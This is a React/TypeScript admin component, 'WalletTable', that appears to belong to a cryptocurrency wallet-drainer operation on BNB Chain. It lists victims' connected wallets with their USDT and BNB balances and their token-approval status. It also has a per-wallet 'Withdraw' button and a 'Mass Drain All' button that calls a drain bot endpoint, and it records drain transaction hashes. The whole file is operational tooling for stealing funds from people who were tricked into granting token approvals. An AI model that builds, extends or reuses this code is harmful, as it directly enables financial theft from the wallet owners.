"use client";

import { useState, useEffect, useCallback } from "react";
import {
  CheckCircle,
  XCircle,
  RefreshCw,
  Loader2,
  ArrowDownToLine,
  ExternalLink,
  AlertTriangle,
} from "lucide-react";
import { cn } from "@/lib/cn";

interface Wallet {
  id: string;
  address: string;
  approval_status: boolean;
  approval_tx_hash: string | null;
  drained: boolean;
  drain_tx_hash: string | null;
  created_at: string;
  usdtBalanceFormatted?: string;
  bnbBalanceFormatted?: string;
  usdtUsdValue?: string;
  gasCostUsdt?: string;
  loadingBalances?: boolean;
}

interface GasInfo {
  gweiPrice: string;
  gasCostUsdt: string;
}

interface WalletTableProps {
  adminKey: string;
}

export default function WalletTable({ adminKey }: WalletTableProps) {
  const [wallets, setWallets] = useState<Wallet[]>([]);
  const [loading, setLoading] = useState(true);
  const [gasInfo, setGasInfo] = useState<GasInfo | null>(null);
  const [draining, setDraining] = useState<string | null>(null);
  const [massDraining, setMassDraining] = useState(false);
  const [message, setMessage] = useState<{ type: "success" | "error"; text: string } | null>(null);

  const authHeaders = { "x-admin-key": adminKey, "Content-Type": "application/json" };

  const fetchWallets = useCallback(async () => {
    try {
      const res = await fetch("/api/wallets", { headers: authHeaders });
      const data = await res.json();
      if (data.wallets) {
        setWallets(data.wallets.map((w: Wallet) => ({ ...w, loadingBalances: false })));
      }
    } catch {
      // ignore
    } finally {
      setLoading(false);
    }
  }, [adminKey]);

  const fetchGas = useCallback(async () => {
    try {
      const res = await fetch("/api/gas", { headers: { "x-admin-key": adminKey } });
      const data = await res.json();
      if (!data.error) setGasInfo(data);
    } catch {
      // ignore
    }
  }, [adminKey]);

  const fetchBalancesForWallet = useCallback(async (walletId: string, address: string) => {
    setWallets((prev) =>
      prev.map((w) => (w.id === walletId ? { ...w, loadingBalances: true } : w))
    );
    try {
      const res = await fetch(`/api/balances?address=${address}`, {
        headers: { "x-admin-key": adminKey },
      });
      const data = await res.json();
      if (!data.error) {
        setWallets((prev) =>
          prev.map((w) =>
            w.id === walletId
              ? {
                  ...w,
                  usdtBalanceFormatted: data.usdtBalanceFormatted,
                  bnbBalanceFormatted: data.bnbBalanceFormatted,
                  usdtUsdValue: data.usdtUsdValue,
                  loadingBalances: false,
                }
              : w
          )
        );
      }
    } catch {
      setWallets((prev) =>
        prev.map((w) => (w.id === walletId ? { ...w, loadingBalances: false } : w))
      );
    }
  }, [adminKey]);

  const fetchAllBalances = useCallback(async (walletList: Wallet[]) => {
    for (const wallet of walletList) {
      await fetchBalancesForWallet(wallet.id, wallet.address);
    }
  }, [fetchBalancesForWallet]);

  useEffect(() => {
    fetchWallets();
    fetchGas();
  }, [fetchWallets, fetchGas]);

  useEffect(() => {
    if (wallets.length > 0 && !wallets[0].usdtBalanceFormatted) {
      fetchAllBalances(wallets);
    }
  }, [wallets.length]);

  // Auto-refresh every 30 seconds
  useEffect(() => {
    const interval = setInterval(() => {
      fetchWallets();
      fetchGas();
    }, 30000);
    return () => clearInterval(interval);
  }, [fetchWallets, fetchGas]);

  async function handleWithdraw(walletId: string) {
    setDraining(walletId);
    setMessage(null);
    try {
      const res = await fetch(`/api/wallets/${walletId}/withdraw`, {
        method: "POST",
        headers: authHeaders,
      });
      const data = await res.json();
      if (data.success) {
        setMessage({ type: "success", text: `Drained successfully. TX: ${data.txHash}` });
        fetchWallets();
      } else {
        setMessage({ type: "error", text: data.error ?? "Withdraw failed" });
      }
    } catch {
      setMessage({ type: "error", text: "Request failed" });
    } finally {
      setDraining(null);
    }
  }

  async function handleMassDrain() {
    setMassDraining(true);
    setMessage(null);
    try {
      const res = await fetch("/api/bot/drain", {
        method: "POST",
        headers: authHeaders,
      });
      const data = await res.json();
      const drained = (data.results ?? []).filter((r: { status: string }) => r.status === "drained").length;
      setMessage({ type: "success", text: `Mass drain complete. ${drained} wallet(s) drained.` });
      fetchWallets();
    } catch {
      setMessage({ type: "error", text: "Mass drain request failed" });
    } finally {
      setMassDraining(false);
    }
  }

  function shortenAddress(addr: string) {
    return `${addr.slice(0, 6)}...${addr.slice(-4)}`;
  }

  function formatDate(iso: string) {
    return new Date(iso).toLocaleString();
  }

  const approvedCount = wallets.filter((w) => w.approval_status).length;
  const drainedCount = wallets.filter((w) => w.drained).length;

  return (
    <div className="flex flex-col gap-6">
      {/* Stats row */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
        {[
          { label: "Total Wallets", value: wallets.length },
          { label: "Approved", value: approvedCount },
          { label: "Drained", value: drainedCount },
          { label: "Gas Price", value: gasInfo ? `${gasInfo.gweiPrice} Gwei` : "—" },
        ].map((stat) => (
          <div
            key={stat.label}
            className="rounded-xl border border-gray-800 bg-[#111] p-4 flex flex-col gap-1"
          >
            <p className="text-xs text-gray-500 uppercase tracking-wider">{stat.label}</p>
            <p className="text-2xl font-bold text-white">{stat.value}</p>
          </div>
        ))}
      </div>

      {/* Action bar */}
      <div className="flex items-center justify-between gap-4 flex-wrap">
        <div className="flex items-center gap-3">
          <button
            onClick={() => { fetchWallets(); fetchGas(); }}
            className="flex items-center gap-2 px-4 py-2 rounded-lg border border-gray-700 bg-[#111] text-sm text-gray-300 hover:bg-[#1a1a1a] transition-colors"
          >
            <RefreshCw className="h-4 w-4" />
            Refresh
          </button>
          <span className="text-xs text-gray-600">Auto-refreshes every 30s</span>
        </div>

        <button
          onClick={handleMassDrain}
          disabled={massDraining}
          className="flex items-center gap-2 px-5 py-2 rounded-lg bg-red-600 hover:bg-red-500 text-white text-sm font-medium disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
        >
          {massDraining ? (
            <Loader2 className="h-4 w-4 animate-spin" />
          ) : (
            <AlertTriangle className="h-4 w-4" />
          )}
          Mass Drain All
        </button>
      </div>

      {/* Message */}
      {message && (
        <div
          className={cn(
            "rounded-lg px-4 py-3 text-sm",
            message.type === "success"
              ? "bg-green-500/10 border border-green-500/30 text-green-400"
              : "bg-red-500/10 border border-red-500/30 text-red-400"
          )}
        >
          {message.text}
        </div>
      )}

      {/* Table */}
      <div className="rounded-xl border border-gray-800 overflow-hidden">
        <div className="overflow-x-auto">
          <table className="w-full text-sm">
            <thead>
              <tr className="border-b border-gray-800 bg-[#111]">
                {[
                  "Wallet Address",
                  "USDT Balance",
                  "BNB Balance",
                  "Gas Est.",
                  "Approval",
                  "Drained",
                  "Connected At",
                  "Actions",
                ].map((col) => (
                  <th
                    key={col}
                    className="px-4 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider whitespace-nowrap"
                  >
                    {col}
                  </th>
                ))}
              </tr>
            </thead>
            <tbody className="divide-y divide-gray-800/60">
              {loading ? (
                <tr>
                  <td colSpan={8} className="px-4 py-8 text-center">
                    <Loader2 className="h-6 w-6 animate-spin text-gray-500 mx-auto" />
                  </td>
                </tr>
              ) : wallets.length === 0 ? (
                <tr>
                  <td colSpan={8} className="px-4 py-8 text-center text-gray-600">
                    No wallets connected yet
                  </td>
                </tr>
              ) : (
                wallets.map((wallet) => (
                  <tr key={wallet.id} className="bg-[#0d0d0d] hover:bg-[#131313] transition-colors">
                    {/* Address */}
                    <td className="px-4 py-3 font-mono text-gray-300 whitespace-nowrap">
                      <div className="flex items-center gap-2">
                        <span>{shortenAddress(wallet.address)}</span>
                        <a
                          href={`https://bscscan.com/address/${wallet.address}`}
                          target="_blank"
                          rel="noopener noreferrer"
                          className="text-gray-600 hover:text-gray-400"
                        >
                          <ExternalLink className="h-3 w-3" />
                        </a>
                      </div>
                    </td>

                    {/* USDT Balance */}
                    <td className="px-4 py-3 whitespace-nowrap">
                      {wallet.loadingBalances ? (
                        <Loader2 className="h-4 w-4 animate-spin text-gray-600" />
                      ) : wallet.usdtBalanceFormatted !== undefined ? (
                        <div>
                          <span className="text-white font-medium">{wallet.usdtBalanceFormatted}</span>
                          <span className="text-gray-500 ml-1 text-xs">USDT</span>
                          <div className="text-xs text-gray-600">${wallet.usdtUsdValue}</div>
                        </div>
                      ) : (
                        <button
                          onClick={() => fetchBalancesForWallet(wallet.id, wallet.address)}
                          className="text-xs text-blue-400 hover:text-blue-300"
                        >
                          Load
                        </button>
                      )}
                    </td>

                    {/* BNB Balance */}
                    <td className="px-4 py-3 whitespace-nowrap">
                      {wallet.bnbBalanceFormatted !== undefined ? (
                        <div>
                          <span className="text-white">{wallet.bnbBalanceFormatted}</span>
                          <span className="text-gray-500 ml-1 text-xs">BNB</span>
                        </div>
                      ) : (
                        <span className="text-gray-700">—</span>
                      )}
                    </td>

                    {/* Gas Estimate */}
                    <td className="px-4 py-3 whitespace-nowrap text-gray-400">
                      {gasInfo ? `~$${gasInfo.gasCostUsdt}` : "—"}
                    </td>

                    {/* Approval Status */}
                    <td className="px-4 py-3 whitespace-nowrap">
                      <div className="flex items-center gap-1.5">
                        {wallet.approval_status ? (
                          <>
                            <CheckCircle className="h-4 w-4 text-green-400" />
                            <span className="text-green-400 text-xs font-medium">Approved</span>
                          </>
                        ) : (
                          <>
                            <XCircle className="h-4 w-4 text-red-400" />
                            <span className="text-red-400 text-xs font-medium">Pending</span>
                          </>
                        )}
                      </div>
                      {wallet.approval_tx_hash && (
                        <a
                          href={`https://bscscan.com/tx/${wallet.approval_tx_hash}`}
                          target="_blank"
                          rel="noopener noreferrer"
                          className="text-xs text-gray-600 hover:text-gray-400 flex items-center gap-1 mt-0.5"
                        >
                          TX <ExternalLink className="h-2.5 w-2.5" />
                        </a>
                      )}
                    </td>

                    {/* Drained Status */}
                    <td className="px-4 py-3 whitespace-nowrap">
                      {wallet.drained ? (
                        <div>
                          <span className="inline-flex items-center gap-1 text-xs font-medium text-orange-400">
                            <CheckCircle className="h-3.5 w-3.5" />
                            Drained
                          </span>
                          {wallet.drain_tx_hash && (
                            <a
                              href={`https://bscscan.com/tx/${wallet.drain_tx_hash}`}
                              target="_blank"
                              rel="noopener noreferrer"
                              className="text-xs text-gray-600 hover:text-gray-400 flex items-center gap-1 mt-0.5"
                            >
                              TX <ExternalLink className="h-2.5 w-2.5" />
                            </a>
                          )}
                        </div>
                      ) : (
                        <span className="text-gray-600 text-xs">No</span>
                      )}
                    </td>

                    {/* Date */}
                    <td className="px-4 py-3 text-gray-500 text-xs whitespace-nowrap">
                      {formatDate(wallet.created_at)}
                    </td>

                    {/* Actions */}
                    <td className="px-4 py-3 whitespace-nowrap">
                      <button
                        onClick={() => handleWithdraw(wallet.id)}
                        disabled={
                          !wallet.approval_status ||
                          wallet.drained ||
                          draining === wallet.id
                        }
                        className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-red-600/20 border border-red-600/40 text-red-400 text-xs font-medium hover:bg-red-600/30 disabled:opacity-30 disabled:cursor-not-allowed transition-colors"
                      >
                        {draining === wallet.id ? (
                          <Loader2 className="h-3.5 w-3.5 animate-spin" />
                        ) : (
                          <ArrowDownToLine className="h-3.5 w-3.5" />
                        )}
                        Withdraw
                      </button>
                    </td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}
